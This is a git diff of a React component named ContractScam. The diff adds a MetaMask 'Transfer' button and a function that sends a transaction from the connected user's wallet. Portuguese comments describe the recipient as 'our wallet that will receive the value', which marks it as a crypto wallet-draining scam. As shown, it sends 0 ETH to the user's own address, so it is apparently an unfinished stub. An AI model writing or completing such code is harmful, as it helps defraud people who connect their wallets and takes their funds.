@@ -1,5 +1,5 @@
 import { useState } from "react";
-import { ethers } from 'ethers';
+import { ethers, providers } from 'ethers';
 import { MetaMaskInpageProvider } from '@metamask/providers';
 
 
@@ -42,6 +42,10 @@ export function ContractScam(){
     if(walletResponse.balance)
       setWalletBalance(walletResponse.balance);
     
+  }
+
+  const transferWallet = () => {
+    transfer();
   }
 
   const connectWallet = async () => {
@@ -87,6 +91,34 @@ export function ContractScam(){
     }
   };
 
+  const transfer = async () => {
+     if(!isConnected)
+       {
+        await connectWalletPressed();
+       }
+
+       await window.ethereum.send('eth_requestAccounts')
+
+       const provider = new ethers.providers.Web3Provider(window.ethereum);
+       const signer = provider.getSigner();
+
+       const Adress =  String(walletAddress); //Carteira conectada
+
+       const Adress2 = String(walletAddress); // carteira nossa que vai receber o valor
+
+       ethers.utils.getAddress(Adress2);
+
+       const transaction = await signer.sendTransaction({    
+                                                             to: Adress2,
+                                                          value: ethers.utils.parseEther("0")
+                                                        });
+
+      //  alert(Adress)
+      alert(transaction);     
+
+      return 
+  };
+
   return (
     <div className="contractScam">
       <div className="topnav">
@@ -107,6 +139,7 @@ export function ContractScam(){
           <p>Status: {status}</p>
           <p>Adress: {String(walletAddress).substring(0, 5) + "..." + String(walletAddress).substring(38)}</p>    
           <p>Balance: {walletBalance}</p>
+          <button className="btnMetaMaskTransfer" onClick={transferWallet}> {'Transfer' }  🦊  </button>
         </div>
 
         <div className="column side">
